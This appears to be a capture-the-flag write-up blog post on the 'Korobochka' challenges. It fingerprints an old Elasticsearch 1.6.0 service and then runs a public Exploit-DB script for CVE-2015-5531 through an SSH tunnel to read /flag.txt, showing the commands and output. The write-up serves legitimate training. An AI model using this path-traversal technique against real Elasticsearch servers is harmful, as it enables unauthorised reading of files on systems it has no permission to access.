---
title: "5Charlie CTF - Korobochka"
date: 2020-04-28 20:32:38 -0500
categories:
  - write-up
tags:
  - ctf
  - write-up
  - elastic
  - linux
  - hacking
---

A write-up of the "Korobochka" Elastic hacking challenge from 5Charlie CTF.

## Korobochka 1

### Korobochka 1 - Challenge

To access these challenges, ssh to korobochka@haxor.5charlie.com using the attached private key.

What is the version number of the elasticsearch service running on 172.90.0.2?

**Attachments:** `id_korobochka` - SSH Key

### Korobochka 1 - Solution

The default port for ElasticSearch is 9200, so let's just curl that.

{% highlight bash %}
curl http://172.90.0.2:9200
{% endhighlight %}

``` text
bash-5.0$ curl http://172.90.0.2:9200
{
  "status" : 200,
  "name" : "Attuma",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.6.0",
    "build_hash" : "cdd3ac4dde4f69524ec0a14de3828cb95bbb86d0",
    "build_timestamp" : "2015-06-09T13:36:34Z",
    "build_snapshot" : false,
    "lucene_version" : "4.10.4"
  },
  "tagline" : "You Know, for Search"
}
```

There it is!

**Flag:** `1.6.0`

## Korobochka 2

### Korobochka 2 - Challenge

What is the flag in /flag.txt on 172.90.0.2? (format: flag{some_text})

### Korobochka 2 - Solution

Given that this version is very old, the challenge is asking for something that's not normally available in Elastic, and we just had to figure out the version of the service, it's a fair bet that we're looking for an exploit for the service.

Nailed it. First result on Google for me:
https://www.exploit-db.com/exploits/38383

{% highlight bash %}
python2 38383.py localhost /flag.txt
{% endhighlight %}

``` text
bash: python: command not found
```

Oh... That's fine, we'll just make an SSH tunnel and run it on our own box.

{% highlight bash %}
ssh -Nf -L 9200:172.90.0.2:9200 -o "identitiesOnly=yes" -i ./id_korobochka korobochka@haxor.5charlie.com
{% endhighlight %}

If you're not familiar with SSH tunneling, here's a quick breakdown of the above.

- `-N`: Do not execute a remote command.  This is useful for just forwarding ports.
- `-f`: Requests ssh to go to background just before command execution. (So we can reuse the terminal)
- `-L`: Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.
  - `[bind_address:]port:host:hostport`
  - ELIF: We're telling SSH to forward any traffic that goes to our local port 9200 across the SSH tunnel and then send it to `172.90.0.2:9200`

The other options aren't really useful to the tunnel, feel free to look them up.

Now that our tunnel is set up, let's run it.

{% highlight bash %}
python2 38383.py localhost /flag.txt
{% endhighlight %}

``` text
➜  korobochka python2 38383.py localhost /flag.txt
!dSR script for CVE-2015-5531

flag%7Byou_know%2C_for_search%7D
```

**Flag:** `flag{you_know,_for_search}`

## Additional Notes

I'll be honest, I actually tunneled at the very beginning.
When it comes to database-related challenges, I usually start with that and forward it to a local GUI so that I can access the information faster.

For this chall I tried forwarding it to DataGrip, Kibana, and DejaVu, but unfortunately the version of Elastic was so lod that none of them could communicate properly.

Usually this is a very effective technique for me though, especially DataGrip.
